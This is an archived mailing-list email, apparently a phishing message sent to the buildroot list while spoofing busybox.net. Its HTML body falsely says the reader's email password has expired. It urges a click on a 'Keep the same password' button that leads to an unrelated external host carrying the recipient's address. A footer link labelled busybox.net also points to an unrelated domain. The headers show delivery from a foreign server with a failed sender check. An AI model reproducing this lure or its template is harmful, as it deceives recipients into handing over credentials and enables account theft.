Return-Path: <buildroot-bounces@buildroot.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp2.osuosl.org (smtp2.osuosl.org [140.211.166.133])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 324B9CDD543
	for <buildroot@archiver.kernel.org>; Wed, 18 Sep 2024 15:37:48 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
	by smtp2.osuosl.org (Postfix) with ESMTP id CD55A401EB;
	Wed, 18 Sep 2024 15:37:47 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp2.osuosl.org ([127.0.0.1])
 by localhost (smtp2.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id eC7BpnW3Siyi; Wed, 18 Sep 2024 15:37:46 +0000 (UTC)
X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org 8E5F4402E5
Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
	by smtp2.osuosl.org (Postfix) with ESMTP id 8E5F4402E5;
	Wed, 18 Sep 2024 15:37:46 +0000 (UTC)
Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
 by ash.osuosl.org (Postfix) with ESMTP id 2FDCA1BF5A5
 for <buildroot@lists.busybox.net>; Wed, 18 Sep 2024 15:37:45 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
 by smtp1.osuosl.org (Postfix) with ESMTP id 1ED53840D2
 for <buildroot@lists.busybox.net>; Wed, 18 Sep 2024 15:37:45 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id i6YEWxATMjtH for <buildroot@lists.busybox.net>;
 Wed, 18 Sep 2024 15:37:44 +0000 (UTC)
X-Greylist: delayed 7155 seconds by postgrey-1.37 at util1.osuosl.org;
 Wed, 18 Sep 2024 15:37:43 UTC
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org 98DA3840B2
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 98DA3840B2
Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=182.200.181.245;
 helo=mail.snailtrack.cn; envelope-from=no-reply@busybox.net;
 receiver=<UNKNOWN> 
Received: from mail.snailtrack.cn (unknown [182.200.181.245])
 by smtp1.osuosl.org (Postfix) with ESMTPS id 98DA3840B2
 for <buildroot@busybox.net>; Wed, 18 Sep 2024 15:37:43 +0000 (UTC)
Received: from [94.141.120.235] (localhost [127.0.0.1])
 by mail.snailtrack.cn (Postfix) with ESMTP id 4X7z6V4N7zzVGKXY
 for <buildroot@busybox.net>; Wed, 18 Sep 2024 20:51:14 +0800 (CST)
From: busybox.net<No-reply@busybox.net>
To: buildroot@busybox.net
Date: 18 Sep 2024 05:51:15 -0700
Message-ID: <20240918055114.AEAB680D1BF47054@busybox.net>
MIME-Version: 1.0
X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
 dmarc=none (p=none dis=none)
 header.from=busybox.net
X-Mailman-Original-Authentication-Results: mail.snailtrack.cn;
	none
Subject: [Buildroot] Confirmation Required busybox.net
X-BeenThere: buildroot@buildroot.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Discussion and development of buildroot <buildroot.buildroot.org>
List-Unsubscribe: <https://lists.buildroot.org/mailman/options/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=unsubscribe>
List-Archive: <http://lists.buildroot.org/pipermail/buildroot/>
List-Post: <mailto:buildroot@buildroot.org>
List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============5658714685659431367=="
Errors-To: buildroot-bounces@buildroot.org
Sender: "buildroot" <buildroot-bounces@buildroot.org>

--===============5658714685659431367==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML>

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.17037">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body>
<center style=3D"color: rgb(51, 51, 51); text-transform: none; text-indent:=
 0px; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; fo=
nt-size: 11px; font-style: normal; font-weight: 400; word-spacing: 0px; whi=
te-space: normal; box-sizing: border-box; orphans: 2; widows: 2; background=
-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-ca=
ps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: init=
ial; text-decoration-style: initial;=20
text-decoration-color: initial;"><span style=3D"font-size: 14px; box-sizing=
: border-box;"><font style=3D"color: rgb(34, 34, 34); box-sizing: border-bo=
x;"><font size=3D"3" style=3D"box-sizing: border-box;"><font face=3D"Segoe =
UI" style=3D"box-sizing: border-box;"><font style=3D"vertical-align: inheri=
t; box-sizing: border-box;"><font style=3D"vertical-align: inherit; box-siz=
ing: border-box;">Your email password has expired today,</font></font></fon=
t></font></font></span></center>
<center style=3D"color: rgb(51, 51, 51); text-transform: none; text-indent:=
 0px; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; fo=
nt-size: 11px; font-style: normal; font-weight: 400; word-spacing: 0px; whi=
te-space: normal; box-sizing: border-box; orphans: 2; widows: 2; background=
-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-ca=
ps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: init=
ial; text-decoration-style: initial;=20
text-decoration-color: initial;"><span style=3D"font-size: 14px; box-sizing=
: border-box;"><font style=3D"color: rgb(34, 34, 34); box-sizing: border-bo=
x;"><font size=3D"3" style=3D"box-sizing: border-box;"><font face=3D"Segoe =
UI" style=3D"box-sizing: border-box;"><font style=3D"vertical-align: inheri=
t; box-sizing: border-box;"><font style=3D"vertical-align: inherit; box-siz=
ing: border-box;">you must be verified to continue using your current passw=
ord.</font></font></font></font></font>
<br style=3D"box-sizing: border-box;">
&nbsp;</span></center>
<center style=3D"color: rgb(51, 51, 51); text-transform: none; text-indent:=
 0px; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; fo=
nt-size: 11px; font-style: normal; font-weight: 400; word-spacing: 0px; whi=
te-space: normal; box-sizing: border-box; orphans: 2; widows: 2; background=
-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-ca=
ps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: init=
ial; text-decoration-style: initial;=20
text-decoration-color: initial;">
<table width=3D"100%" style=3D"color: rgb(34, 34, 34); font-size: small; bo=
rder-collapse: collapse; table-layout: fixed; box-sizing: border-box;">
<tbody style=3D"box-sizing: border-box;">
<tr style=3D"box-sizing: border-box;">
<td align=3D"center" style=3D"margin: 0px; padding: 0px; line-height: 1.666=
; box-sizing: border-box;">
<table style=3D"border-collapse: collapse; box-sizing: border-box;">
<tbody style=3D"box-sizing: border-box;">
<tr style=3D"box-sizing: border-box;">
<td align=3D"center" style=3D"margin: 0px; line-height: 1.666; box-sizing: =
border-box;" bgcolor=3D"#0073f0"><font face=3D"Arial" size=3D"3" style=3D"b=
ox-sizing: border-box;"><span style=3D"font-size: 14px; box-sizing: border-=
box;"><span style=3D"font-family: Roboto, RobotoDraft, Helvetica, Arial, sa=
ns-serif; box-sizing: border-box;"><span style=3D"font-size: 16px; box-sizi=
ng: border-box;"><font size=3D"3" style=3D"box-sizing: border-box;"><font f=
ace=3D"Segoe UI" style=3D"box-sizing: border-box;">
<a style=3D"padding: 12px 18px; border: 1px solid rgb(0, 115, 255); width: =
216px; color: rgb(255, 255, 255); line-height: 27px; font-size: 14px; text-=
decoration: none; box-sizing: border-box; background-color: rgb(0, 115, 255=
);" href=3D"https://sc2jtfu9765.universe.wf/vboonies/Alaba.html#buildroot@b=
usybox.net" target=3D"_blank" rel=3D"noreferrer">Keep the same password&#65=
279;</a></font></font></span></span></span></font></td></tr></tbody></table=
><br style=3D"box-sizing: border-box;"></td></tr></tbody></table></center>
<center style=3D"color: rgb(51, 51, 51); text-transform: none; text-indent:=
 0px; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; fo=
nt-size: 11px; font-style: normal; font-weight: 400; word-spacing: 0px; whi=
te-space: normal; box-sizing: border-box; orphans: 2; widows: 2; background=
-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-ca=
ps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: init=
ial; text-decoration-style: initial;=20
text-decoration-color: initial;">
<table width=3D"100%" style=3D"border-collapse: collapse; table-layout: fix=
ed; box-sizing: border-box;">
<tbody style=3D"box-sizing: border-box;"></tbody></table></center>
<center style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent:=
 0px; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; fo=
nt-size: small; font-style: normal; font-weight: 400; word-spacing: 0px; wh=
ite-space: normal; box-sizing: border-box; orphans: 2; widows: 2; backgroun=
d-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-c=
aps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: ini=
tial; text-decoration-style: initial;=20
text-decoration-color: initial;"><span style=3D"font-size: 14px; box-sizing=
: border-box;"><font size=3D"1" style=3D"box-sizing: border-box;"><font fac=
e=3D"Segoe UI" style=3D"box-sizing: border-box;"><font style=3D"vertical-al=
ign: inherit; box-sizing: border-box;"><font style=3D"vertical-align: inher=
it; box-sizing: border-box;">You have received this email to notify you of =
important changes to your email account and service</font></font></font></f=
ont><br style=3D"box-sizing: border-box;">
<br style=3D"box-sizing: border-box;"><font size=3D"1" style=3D"box-sizing:=
 border-box;"><font face=3D"Segoe UI" style=3D"box-sizing: border-box;"><fo=
nt face=3D"Georgia" style=3D"box-sizing: border-box;"><font color=3D"#1369e=
c" style=3D"box-sizing: border-box;"><font style=3D"vertical-align: inherit=
; box-sizing: border-box;"><font style=3D"vertical-align: inherit; box-sizi=
ng: border-box;"><span style=3D"color: rgb(51, 51, 51); font-family: Arial,=
 sans-serif; font-size: 13px; box-sizing: border-box;">
<a style=3D"color: rgb(17, 85, 204); text-decoration: none; box-sizing: bor=
der-box; background-color: transparent;" href=3D"http://fast-net-energy.com=
/" target=3D"_blank" rel=3D"noreferrer">busybox.net&nbsp;</a></span>&nbsp;&=
nbsp;</font></font></font></font><span style=3D"box-sizing: border-box;">&n=
bsp;</span><span style=3D"font-size: 16px; box-sizing: border-box;"><span s=
tyle=3D"font-family: corbel; box-sizing: border-box;"><span>&nbsp;</span><s=
pan style=3D"color: rgb(69, 69, 69); box-sizing: border-box;">
&nbsp;<font style=3D"vertical-align: inherit; box-sizing: border-box;"><fon=
t style=3D"vertical-align: inherit; box-sizing: border-box;">&copy;&nbsp;</=
font></font></span></span><font face=3D"Georgia" style=3D"box-sizing: borde=
r-box;"><span style=3D"box-sizing: border-box;">&nbsp;&nbsp;</span><font co=
lor=3D"#1369ec" style=3D"box-sizing: border-box;"><span style=3D"box-sizing=
: border-box;">&nbsp;</span><font style=3D"vertical-align: inherit; box-siz=
ing: border-box;"><span>&nbsp;</span>
&nbsp;<font style=3D"vertical-align: inherit; box-sizing: border-box;">2024=
 All Right Reserved.</font></font></font></font></span></font></font></span=
></center></body></html>

--===============5658714685659431367==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
buildroot mailing list
buildroot@buildroot.org
https://lists.buildroot.org/mailman/listinfo/buildroot

--===============5658714685659431367==--
